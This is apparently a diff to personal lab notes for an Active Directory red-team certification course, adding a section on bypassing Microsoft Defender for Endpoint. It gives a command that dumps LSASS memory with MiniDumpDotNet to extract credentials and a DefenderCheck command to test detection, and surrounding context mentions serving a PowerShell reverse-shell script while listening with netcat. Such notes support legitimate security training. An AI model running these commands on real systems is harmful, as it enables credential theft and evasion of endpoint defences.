@@ -2689,3 +2689,18 @@ Cool!!
 3. Now I will open the http server and transfer the Invoke-PowerShellTcp script to get Reverse Shell, and I will start eavesdropping using netcat.
 
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/9b25092c-4f0a-4fe8-be12-5d99b9bb354e)
+
+
+# EDR - MDE (Microsoft Defender Endpoint) Bypass
+### Credential Extraction - MiniDumpDotNet
+[MiniDumpDotNet](https://github.com/WhiteOakSecurity/MiniDumpDotNet)
+```
+.\minidumpdotnet.exe <LSASS PID> <minidump file>
+```
+### check if it is detected by windows defender using DefenderCheck
+```
+.\DefenderCheck.exe C:\AD\Tools\minidumpdotnet.exe
+```
+
+### Learning Objective 23
+check the LabManual page number 122
